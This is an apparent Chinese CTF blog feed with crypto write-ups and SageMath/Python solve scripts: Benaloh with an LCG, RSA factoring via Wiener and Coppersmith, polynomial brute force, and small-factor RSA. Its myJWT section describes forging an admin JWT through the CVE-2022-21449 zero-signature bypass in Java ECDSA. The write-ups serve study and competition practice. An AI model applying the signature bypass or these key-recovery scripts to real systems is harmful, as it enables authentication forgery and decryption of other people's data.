(p-1)</em>, <em>gcd(r, (p-1)/r) = 1</em>, and <em>gcd (r,(q - 1)) =
1</em>;</p></li>
<li><p>set <span class="math display">\[n = pq,  \phi =
(p-1)(q-1)\]</span></p></li>
<li><p><span class="math display">\[ choose y \in Z{^*_n}\quad
such\;that\;y^{\phi/r} \not\equiv1\;mod\;n\]</span></p>
<p><strong>Note:</strong> If <em>r</em> is composite, it was pointed out
by Fousse et al. in 2011that the above conditions (i.e., those stated in
the original paper) are insufficient to guarantee correct
decryption</p></li>
<li><p>Set <span class="math display">\[x\;=\;y^{\phi/r}\;mod\;n\]</span></p>
<p>The public key is then <span class="math display">\[{\displaystyle
y,n}\]</span>, and the private key is <span class="math display">\[{\displaystyle \phi ,x}\]</span></p></li>
</ol>
<h2 id="message-encryption">Message Encryption</h2>
<p>To encrypt message <span class="math display">\[ m\in
Z_r\]</span>:</p>
<ol type="1">
<li>Choose a random <span class="math display">\[u \in Z{_n^*}
\]</span>;</li>
<li>set <span class="math display">\[E_r(m) = y^mu^r\;mod\;n
\]</span></li>
</ol>
<h2 id="message-decryption">Message Decryption</h2>
<p>To decrypt message <span class="math display">\[ c\in
Z{_n^*}\]</span>:</p>
<ol type="1">
<li>comupte <span class="math display">\[a = c ^{\phi/r} \;mod
n\]</span></li>
<li>output <span class="math display">\[m = log_x(a)\]</span>, i.e.,find
m such that <span class="math display">\[x^m \;\equiv1 \; mod
n\]</span></li>
</ol>
<p>Baby-step giant-step algorithm can be used to recover m in <span class="math display">\[O(\sqrt{r})\]</span> time and space</p>
<p>题里u是用lcg依次生成的，每四位对明文进行加密。我们可以知道前几组mask的值，所以相当于有4组（更多约出来也是这样的）三元方程。为了更好的求根，这里使用<span class="math display">\[GrÖbner\]</span>基，找到一组多项式理想的约化。求出的<span class="math display">\[GrÖbner\]</span>基有以下形式： <span class="math display">\[
c^{17} + B_0 = 0\\
u + B_1*c=0\\
a + B_2=0
\]</span> 又由lcg的推导有： <span class="math display">\[
x_{i+1}=ax_i+c=-B_2x_i+c=...=C_{i+1}c\\
所以x{_{i}^{17}}=(C_ic)^{17}=C{_i^{17}}c^{17}=C{_i^{17}}(-B_0)\\
而C_i已知，因此可求解
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	n, y = <span class="built_in">eval</span>(f.readline())</span><br><span class="line">	R = Integers(n)</span><br><span class="line">	z = <span class="built_in">list</span>(<span class="built_in">map</span>(R, f.readlines()))</span><br><span class="line"></span><br><span class="line">y = R(y)</span><br><span class="line">log = &#123;y^i: <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r)&#125;</span><br><span class="line"></span><br><span class="line">P.&lt;u, a, c&gt; = PolynomialRing(R)</span><br><span class="line"></span><br><span class="line">G = []</span><br><span class="line">f = u</span><br><span class="line"><span class="keyword">for</span> i, m <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="string">b&#x27;di&#x27;</span>.<span class="built_in">hex</span>()):</span><br><span class="line">	G.append(f^r - z[i]/y^<span class="built_in">int</span>(m, <span class="number">16</span>))</span><br><span class="line">	f = a*f + c</span><br><span class="line"></span><br><span class="line">B = Ideal(G).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(B)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = -B[<span class="number">1</span>].monomial_coefficient(c)*c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(z)):</span><br><span class="line">	flag += log[z[i]/(f.monomial_coefficient(c)^r*(-B[<span class="number">0</span>].constant_coefficient()))]</span><br><span class="line">	f = -B[<span class="number">2</span>].constant_coefficient()*f + c</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(flag))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>Carmichael function</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯</title>
    <url>/2022/08/01/2022/%E5%BC%BA%E7%BD%91%E6%9D%AF/</url>
    <content><![CDATA[<p>做了四道，获得了18名</p>
<span id="more"></span>
<h1 id="lattice-cry">Lattice $ cry</h1>
<p>paper链接：https://eprint.iacr.org/2020/461.pdf，里面贴了代码但是感觉没啥用</p>
<p>两题都可规化到这个Hidden Subset Sum
Problem下，第一题比较直接，矩阵<strong>A</strong>*B =<strong>C</strong>
mod
n，要恢复B格基规约后的第一个行向量，其中A的元素很大而B的很小。paper里的思路是先用C构造出一个格，对这个格做BKZ算法得到它的正交基，再算一次正交基即可得到原矩阵的共轭矩阵。第二部再利用共轭矩阵恢复最短向量和x_i，可惜自己能力不足细节不能好好把握，之后有空再复盘8.</p>
<h1 id="factor">Factor</h1>
<p>paper链接：https://eprint.iacr.org/2015/399.pdf</p>
<p>因为和d3的一样所以直接就找到了，可惜还是慢一步出的，又错失血</p>
<p>gen123对应paper里的543，不过因为b给了所以只用打一元copper了，慢慢往回推得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">n11=<span class="number">801049932940568005269978912396585741498810389425615966036828877784238116634177290247194019425111606811005728521368879065336038221361037062407029836155148874719789714345603547779284558101833801155509762818376470874215789574939002212274399950433269775325144015468620263028557804618774240232988157961712628677901130814703917513004114547234375629747176834581166306552311075522669403347828095831520693563291249869832390698646691647204371133362254846234990175138047928703289833460734235302093916147489509206061923877623300596194317059884824322527532662470348274079800781120104946546063500763852622187404608639542858285661288293918912184354236687975919510300221932074135531028314170475917110204254042336116619335841213418990605590620842511615815443114612333881430920769002933370887494558640833005339906706603497809846863863967391543647049224309556936909768179259581851520214669904560467640473144481633920438487615788689262961741053146610554997224861331949716721056553499531186695425439163222802917813140266513735841447717418846360096652592844940362932171019143434080184728093326143821165097895058935372215708948088248596585127475770021962501262915274497478428868130455122612016408381607561200802267038869516896665387576895570245272035575637</span></span><br><span class="line">n12=<span class="number">635401970340205725139325006504978344512744926958688031423448003992072769931808217486709574151492230879374574313457662436423263437792389711379687512056391117410807565492548718691166183372633151644917135272259770997096195518489056319350258673723095417922153182423913759272893696867426193704479752772511081457729513843682588951499551132432923147997238597538055902932123792252593514225328196541483451747314048080824405530742533473914329294346486691684904100406972073037050089861816604505650042953778360621934380815999541183067585498606053857125775979915077329566722531830089714823979965934190338538564188253271016367299890015449611141166780048763403252309160517164569110740561584100839212138661881615351382946813818078899882595313362934594951895560189003438775450675343590147821186953526262224973333962454561275321925151619178204499342339749637758100126893330994252902926509705617882239610380420830791088907378397226817514095468815228186716220057075095711894070032344613244803934541318573847029365563159918970404057137270884587905766828750387753130065274147902379993224780149663600462492281891320702134153853359393588902750423972068679293373333869389393970353760507436913233657422185531482023237384247535554666481760197851108297145147371</span></span><br><span class="line">e11=<span class="number">1898839980562048754607069073527844852132536432440793106124181406514770178066775988232362054809850074774981836898118651469424148725970708199461113088705044905633592578936333918328544505910996746428679299419879472444790941363558025887620570856598548320246426354974395765243741646121743413447132297230365355148066914830856904433750379114692122900723772114991199979638987571559860550883470977246459523068862898859694461427148626628283198896659337135438506574799585378178678790308410266713256003479022699264568844505977513537013529212961573269494683740987283682608189406719573301573662696753903050991812884192192569737274321828986847640839813424701894578472933385727757445011291134961124822612239865</span></span><br><span class="line">e12=<span class="number">1262647419018930022617189608995712260095623047273893811529510754596636390255564988827821761126917976430978175522450277907063247981106405519094560616378241247111698915199999363948015703788616554657275147338766805289909261129165025156078136718573006479030827585347458143645738353716189131209398056741864848486818076440355778886993462012533397208330925057305502653219173629466948635110352752162442552541812665607516753186595817376029707777599029040724727499952161261179707271814405907165207904499722122779096230563548011491932378429654764486855147873135769116637484240454596231092684424572258119768093562747249251518965380465994055049411715353547147466711949391814550591591830515262296556050946881</span></span><br><span class="line"></span><br><span class="line">n2=<span class="number">209798341155088334158217087474227805455138848036904381404809759100627849272231840321985747935471287990313456209656625928356468120896887536235496490078123448217785939608443507649096688546074968476040552137270080120417769906047001451239544719039212180059396791491281787790213953488743488306241516010351179070869410418232801398578982244984544906579574766534671056023774009163991804748763929626213884208260660722705479782932001102089367261720194650874553305179520889083170973755913964440175393646890791491057655226024046525748177999422035469428780228224800114202385209306803288475439775037067014297973202621118959024226798935588827359265962780792266516120013602384766460619793738405476219362508944225007365127768741191310079985425349292613888185378948854602285379329682053663283534930182589905986063348509703027498270111412063194971956202729807710253369312175636837558252924035002153389909587349043986253518050303628071319876207392440085675892353421232158925122721273720564784886530611286461575045181073744696415657043278123662980166364494583141297996445429477446442693717498789391918530672770193730629928408766563592081857706608049076318165712479742423149330311238462044666384622153280310696667586565906758451118241914402257039981388209</span></span><br><span class="line">e2=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line"></span><br><span class="line">c11=<span class="number">18979511327426975645936984732782737165217332092805655747550406443960209507493506811471688957217003792679188427155591583024966608843371190136274378868083075515877811693937328204553788450031542610082653080302874606750443090466407543829279067099563572849101374714795279414177737277837595409805721290786607138569322435729584574023597293220443351227559400618351504654781318871214405850541820427562291662456382362148698864044961814456827646881685994720468255382299912036854657082505810206237294593538092338544641919051145900715456411365065867357857347860000894624247098719102875782712030938806816332901861114078070638796157513248160442185781635520426230183818695937457557248160135402734489627723104008584934936245208116232179751448263136309595931691285743580695792601141363221346329077184688857290503770641398917586422369221744736905117499140140651493031622040723274355292502182795605723573863581253354922291984335841915632076694172921289489383700174864888664946302588049384130628381766560976143458735712162489811693014419190718601945154153130272620025118408017441490090252674737105557818759190934585829634273698371996797545908125156282869589331913665938038870431655063063535672001112420959158339261862052308986374193671007982914711432579</span></span><br><span class="line">c12=<span class="number">336587005671304527566745948355290412636261748969581976214239578621816863343117433524033533838636941679300497270909696775021031004312477997130741361709262822736904340641138652359632950455651920464042448022467664596484055174270895170499076347333381222768518599018520948098943626229061996126260154604038101543546588917619576702866444998578555907070990331574722135141778182631559802154493815687284077524469331290249057291163803290619701104007028836609832847351748020354798788508790258935718399783002069490123663345156902440501507117289747695510266461539019431610123351176227443612317037899257774045751487135646052309277098939919088029284437221840182769808850184827681307611389353392683707516141736067793897378911235819049432542758429901945202632117089595899280390575706266239252841152490534353760118231918190110043319877744119083811214707593122757409240645257409097436061825613686773916466122693168971062418046703969144004779270391320645495586024342668002497155358623795942692477164489475917351003149045087283510728981096449890130735055015075557614253867698702479920619299919816768972581273507837309179450374634916567083251630203067065663910073926990517108921490442919372774170201239734064819301693527366233007925670043499415100789027665</span></span><br><span class="line">c2=<span class="number">18352572608055902550350386950073774530453857897248738030380007830701135570310622004368605208336922266513238134127496822199799761713782366178177809597137102612444147565578155260524747439899150012223027218489946124086276814899675563837669559795153349686434242738207425653079514376089070980797596457151965772460109519623572502109592612394316680202287712465721767341302234806130244551387296133051760893033194962691942040228545508895009195291106297581470066545991352668826197346830561010198417527057944507902143965634058848276017283478933675052993657822322866778994956205033704582047618324071045349072526540250707463112668579342537349567247810715604220690215313641329522674080146047291570752430231923566302463491877377617044768978997438596643458475128936850994934029476030136643053997549253792076260765459166618369864942681056864815996253315631930002738854235841120321870075261782250357506436825550088826469396508045912258303652912217151127280959435741419961721418428605515096160344688795655562889755165362006775317188009008288782691705879510655892181975003485714604340542378477388225736316682379616676770234557939471098919647053799313777248678455620231721202780830980063824003076308811540534492317719811588898727134190545533822501681653</span></span><br><span class="line">c3=<span class="number">113097822337683973761068913398570777162211043704088253732500045618770280334319497174908657828372816818344430304314992760410247741225285170975119344962728883084314382093407445567724674775086423808679124143380073906159023182353116556175251427048715466914368972746661938211846262612414049036821553068430149530397389927209475908905748728402722287875974303298260579839357610962198145974153609818939841880084892796820949226354126424023144300953584658958900737493704530725894948802258740332090822797815745616247879170037794873059391625680745994045522420168248552864215035136318711240256011217929372430302003068882829637056296413462078222453765071094277727760527662423010417144554652783429899139309180017349156600053882338180319473460877576898373222480215735280046214925463242092830060830764299787309912687294672319845054775281463150375545716818434962456139485501224661520991156961587158843064393883274763714930309353593180897123378717852182761518709151878662808890356934477932099818218743384674756674800089177733447066489275506387382342429495897972218764782517198727316942685748481956118012927027254979181519862451112593068440686462293151078537886822555211870303467014484443432209106264020502334805536091587252238173816637270028678636848763</span></span><br><span class="line"></span><br><span class="line">n3=<span class="number">539779851369541956878655738599584730199799866957191805784596190682932284216781781433367450841202917758999300635019369629627621029957135109806205877317954671312041249493462048283611940752235036153024920172209763260723728345918562258401803973624430150143563078517485996070862532682695228590709019451174548520135142052216785774589096706631010293690859363524584240662502290912412366366114571976050857239915691266377257797199583543940504695517331512813468837128344612227973709974625418257243011036826241599265375741977853552204640800449679679351666009764297016524814036295707311913711955324055690490892097177271718850857268982130811714517356073266905474635370690445031512184247179039751734276906533177939993769044135143389748416635981226449566039039202521305851567296884751935162651063209779647359922622084851547605090230221057349511482738300221222563908357379545905837110168948295030747460300104202323692732549831403834387939156877086852393515817984772384147449841124275061609701453997579569931391166586163299940486204581696722731952467570857217406030804590055255431828403195798003509083922294733709507134156466158642941338493323430671502043066148246348074878064089651235355282144209668143249348243220714471988019011613749340243917652821</span></span><br><span class="line">e3=<span class="number">8179300978753084587812861894047395225516049110376948812109811319430275614612773726672345893359691900281432484382670047044697374818043512731533402576374645405477207239801498428774783768163880078495448747421425078521981578408638790336528372019271073712013371141939808017049399434858687299480461753638164719404612128939787055797762174745092074547412183349192156638711750872083313795551439465507724807626674514935170104573715458782366469587138508845980490673890245713729782917089910271980557159592807350504157192913530007199510144004848020221181558472160543018733124225266127379373751910439604459368078652499029070936707349862139053913745186413782066470461478961703013591655136140060879250067379283913798867648758171004535775565306842444545755351202796833177560656564652632975685912935281581268141803696686952259539945588609591385807620108279333498170028167338690235117003515264281843953984997958878272347778561933726792473981855755454522886321669676790813189668084373153897754540290867346751033567500922477317530445967753955221454744946208555394588111484610700789566547507402309549957740815535069057837915204852490930168843605732632328017129154852857227895362549146737618906180651623216848500491438142456250653458053922622240299736136335179639180898730269690699965799644757774472147210271111150769048976871249731156387939260749192370361488285775377622944817570292095201906142567403539151179209316853493906909989301225903409448461436855145</span></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">idx = (r*(r-<span class="number">1</span>)) / ((r+<span class="number">1</span>)*(r+<span class="number">1</span>))</span><br><span class="line">delta = <span class="built_in">int</span>(<span class="built_in">pow</span>(mpz(n3), idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFra</span>(<span class="params">x, y</span>): </span><br><span class="line">    cF = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cF += [x // y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> cF</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Simplify</span>(<span class="params">ctnf</span>): </span><br><span class="line">    numerator = <span class="number">1</span></span><br><span class="line">    denominator = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ctnf[::-<span class="number">1</span>]: </span><br><span class="line">        numerator, denominator = x * numerator + denominator, numerator </span><br><span class="line">    <span class="keyword">return</span> (numerator, denominator)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getit</span>(<span class="params">c</span>):</span><br><span class="line">    cf=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(c)):</span><br><span class="line">        cf.append(Simplify(c[:i])) </span><br><span class="line">    <span class="keyword">return</span> cf </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    cf=continuedFra(e,n)</span><br><span class="line">    <span class="keyword">for</span> (q1,q2) <span class="keyword">in</span> getit(cf):</span><br><span class="line">        <span class="keyword">if</span> q1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> n11%q1==<span class="number">0</span> <span class="keyword">and</span> q1!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> (q1,q2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没找到能覆盖的分子/分母&#x27;</span>)</span><br><span class="line"></span><br><span class="line">q11,q12=wienerAttack(n11,n12)</span><br><span class="line">p11 = <span class="built_in">int</span>(gmpy2.iroot(n11//q11, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p12 = <span class="built_in">int</span>(gmpy2.iroot(n12//q12, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">phi11 = (p11^<span class="number">2</span>-p11) * (q11-<span class="number">1</span>)</span><br><span class="line">phi12 = (p12^<span class="number">2</span>-p12) * (q12-<span class="number">1</span>)</span><br><span class="line">d11 = inverse_mod(e11, phi11)</span><br><span class="line">d12 = inverse_mod(e12, phi12)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c11, d11, n11)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c12, d12, n12)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>(m2)</span><br><span class="line">PR1.&lt;x&gt; = PolynomialRing(Zmod(n2), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f = m1*m2*x - (m2 - m1)</span><br><span class="line">f = f.monic()</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p2 = <span class="built_in">int</span>(gcd(m1*m2*x0 - (m2 - m1), n2))</span><br><span class="line">p2 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p2),<span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q2 = <span class="built_in">int</span>(n2 // p2^<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">phi2 = (p2^<span class="number">7</span> - p2^<span class="number">6</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2 = inverse_mod(e2, phi2)</span><br><span class="line">b = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">b = <span class="built_in">int</span>(b)</span><br><span class="line">PR2.&lt;y&gt; = PolynomialRing(Zmod(n3), <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">g = e3*y - b</span><br><span class="line">y0 = g.monic().small_roots(X=<span class="number">2</span>^<span class="number">700</span>,beta=<span class="number">0.75</span>,epsilon=<span class="number">0.05</span>)[<span class="number">0</span>]</span><br><span class="line">p3 = gcd(e3*y0 - b, n3)</span><br><span class="line">p3 = <span class="built_in">int</span>(iroot(<span class="built_in">int</span>(p3), <span class="number">6</span>)[<span class="number">0</span>])</span><br><span class="line">q3 = n3 // p3^<span class="number">7</span></span><br><span class="line">phi3 = (p3^<span class="number">7</span> - p3^<span class="number">6</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">d3 = inverse_mod(e3, phi3)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c3, d3, n3)))</span><br><span class="line"><span class="comment">#b&#x27;qwb&#123;8633ce6d-fece-4cf1-8f0f-f27e5bf6d678&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="myjwt">myJWT</h1>
<p>cve-2022-21449，参考soreatu师傅的博客：</p>
<p>https://blog.soreatu.com/posts/analysis-of-cve-2022-21449-bypass-java-signature-check-by-two-zeros/</p>
<p>关键是让sig传(0,
0)，查看代码后发现第一段不变，sig传0但是要考虑编码，b'A'就是0</p>
<p>nc连上去，获取token，所以第一段jwt不变，第二段jwt把admin的值改为true，第三段放A</p>
<p><img src="/images/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20220803133111714.png" alt="image-20220803133111714"></p>
<h1 id="polydiv">polydiv</h1>
<p>看代码看半天，nc一下就知道是怎么回事了，浪费了不少时间</p>
<p>先过hash截断</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dehash</span>(<span class="params">s, re</span>):</span><br><span class="line">    alphabet = string.ascii_letters+string.digits</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=s+a+b+c+d</span><br><span class="line">                    <span class="keyword">if</span>  <span class="built_in">bin</span>(<span class="built_in">int</span>(sha256(ss.encode()).hexdigest(),<span class="number">16</span>)).endswith(re):</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dehash(<span class="string">&#x27;GTgC3xzo&#x27;</span>, <span class="string">&#x27;00000000000000000000&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>题目给r =
a*b+c，已知r，a，c要求b，只不过这里的abcr都是在模2的多项式下的，sage直接除会显示分式，应该是要给个模</p>
<p>nc后发现r的最高次都是14，a的是7，那么b的最高位也是7，爆破就能出，复杂度为2^8，很快</p>
<p>但是因为之前看代码用了太多时间，加上有点紧张，于是是手动40次出的（x</p>
<p>爆破代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">R = PolynomialRing(GF(<span class="number">2</span>),<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">x = R.gen()</span><br><span class="line">r = x^<span class="number">14</span> + x^<span class="number">12</span> + x^<span class="number">10</span> + x^<span class="number">8</span> + x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">3</span> + x^<span class="number">2</span> + x</span><br><span class="line">a = x^<span class="number">7</span> + x^<span class="number">5</span> + x^<span class="number">4</span> + x + <span class="number">1</span></span><br><span class="line">c = x^<span class="number">6</span> + x^<span class="number">3</span> + x</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                            <span class="keyword">for</span> i8 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                                b = i1 + i2*x + i3*x^<span class="number">2</span> + i4*x^<span class="number">3</span> + i5*x^<span class="number">4</span> + i6*x^<span class="number">5</span> + i7*x^<span class="number">6</span> + i8*x^<span class="number">7</span></span><br><span class="line"><span class="comment">#                                 print(b)</span></span><br><span class="line">                                <span class="keyword">if</span> b*a == r-c:</span><br><span class="line">                                    <span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
<h1 id="asr">ASR</h1>
<p>生成没什么说法，先开根，然后用yafu一顿暴力分解，多开几个挂1个多小时，然后分出来了。可惜还是慢了，第五出的没拿到血</p>
<p>分解之后要分析一下：e | P2 and e |
P4，本来想的是分别开根然后crt。但是P1和P3已经凑够了512位，如果m也达到这个位数，那len(m)就有64位了，题目给的len是48，因此可直接用P1和P3出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">8250871280281573979365095715711359115372504458973444367083195431861307534563246537364248104106494598081988216584432003199198805753721448450911308558041115465900179230798939615583517756265557814710419157462721793864532239042758808298575522666358352726060578194045804198551989679722201244547561044646931280001</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">945272793717722090962030960824180726576357481511799904903841312265308706852971155205003971821843069272938250385935597609059700446530436381124650731751982419593070224310399320617914955227288662661442416421725698368791013785074809691867988444306279231013360024747585261790352627234450209996422862329513284149</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">P1 = <span class="number">223213222467584072959434495118689164399</span></span><br><span class="line">P2 = <span class="number">218566259296037866647273372633238739089</span></span><br><span class="line">P3 = <span class="number">260594583349478633632570848336184053653</span></span><br><span class="line">P4 = <span class="number">225933944608558304529179430753170813347</span></span><br><span class="line"></span><br><span class="line">phi = P1*(P1-<span class="number">1</span>)*P2*(P2-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)*P4*(P4-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> P1**<span class="number">2</span>*P2**<span class="number">2</span>*P3**<span class="number">2</span>*P4**<span class="number">2</span> == n</span><br><span class="line"></span><br><span class="line">phi_ = P1*(P1-<span class="number">1</span>)*P3*(P3-<span class="number">1</span>)</span><br><span class="line">d0 = inverse_mod(e, phi_)</span><br><span class="line">m0 = <span class="built_in">pow</span>(c, d0, P1^<span class="number">2</span>*P3^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># d1 = nthroot_mod(c,e,P2^2,all_roots=True)</span></span><br><span class="line"><span class="comment"># d2 = nthroot_mod(c,e,P4^2,all_roots=True)</span></span><br><span class="line">long_to_bytes(m0)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;Fear_can_hold_you_prisoner_Hope_can_set_you_free&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>分区赛</title>
    <url>/2022/06/27/2022/%E5%88%86%E5%8C%BA%E8%B5%9B/</url>
    <content><![CDATA[<p>题不难，要查找信息and稳住心态</p>
<span id="more"></span>
<h1 id="dual">dual</h1>
<p>前一部分是要用xy求椭圆曲线的生成参数；</p>
<p>后一部分是NSA的后门，是一个随机数发生器，用一系列貌似随机的数和椭圆上的点做乘积，最后输出低240位作为每一轮的结果。因为P,
Q是固定的，椭圆曲线的参数也是固定的，P、Q之间必然存在一个线性关系，那么就用这个线性关系去预测下一次的结果。</p>
